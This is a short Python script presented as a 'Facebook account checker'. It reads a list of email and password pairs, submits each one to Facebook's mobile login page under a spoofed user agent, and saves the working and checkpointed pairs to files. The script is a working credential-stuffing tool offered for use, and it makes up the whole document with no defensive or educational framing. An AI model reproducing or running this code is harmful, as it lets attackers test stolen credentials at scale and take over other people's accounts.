#Facebook account checker v1.0 - coded by afokay ./isilent
import os, requests

HEADER = '\033[95m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

live = open('live.txt', 'w')
ch = open('ch.txt', 'w')

os.system('clear')
print ("-"*47)
print ("-  "+RED+"FACEBOOK ACCOUNT CHECKER v1.0 | ./isilent  "+RESET+"-")
print ("-"*47)

empas = raw_input(RED+'[!]'+RESET+' Input your list : ')
print ("\nChecking...")

link = 'https://mobile.facebook.com/login.php'
headers = {
'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
'Accept-Language' : 'en-US,en;q=0.5'
}
empas = open(empas, 'r').readlines()

for list in empas:
    me = list.strip().split('|')

    data = {
    'email': me[0],
    'pass': me[1]
    }
    shot = requests.post(link, headers=headers, data=data).text

    if "xc_message" in shot:
        print (GREEN+"[LIVE] "+RESET+ me[0] +"|"+me[1])
        live.write('[LIVE] ' + me[0] + ' | ' + me[1] + '\n')
    elif "checkpointSubmitButton-actual-button" in shot:
        print (YELLOW+"[CHECKPOINT] "+RESET+ me[0] +"|"+me[1])
        ch.write('[CHECKPOINT] ' + me[0] + ' | ' + me[1] + '\n')
    elif "login_error" in shot:
        print (RED+"[DIE] "+RESET+ me[0] +"|"+me[1])
    else:
        print (RED+"[DIE] "+RESET+ me[0] +"|"+me[1])

print ("\nDone...\nChecking by ./isilent")
#./isilent
